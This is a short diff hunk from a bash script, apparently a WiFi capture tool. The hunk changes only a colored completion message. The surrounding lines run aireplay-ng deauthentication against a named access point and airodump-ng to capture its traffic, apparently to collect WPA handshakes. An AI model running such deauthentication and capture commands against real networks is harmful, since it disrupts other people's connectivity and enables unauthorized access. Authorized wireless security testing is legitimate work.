@@ -28,7 +28,7 @@ if [ "$(id -u)" == "0" ]; then
 		echo -e "[${redColour}*${endColour} Use: ./capture.sh -a [Network name] -c [Network chanel]"
 	else
     interface=$(iw dev | awk '$1=="Interface"{print $2}')
-    xterm -hold -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$apName' $interface && echo 'Done!'" &
+    xterm -hold -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$apName' $interface && echo -e '\n[${greenColour}*${endColour}] Done!'" &
 
     aireplay_ng_xterm_PID=$!
     airodump-ng -w Captura -c $apChanel --essid "$apName" $interface
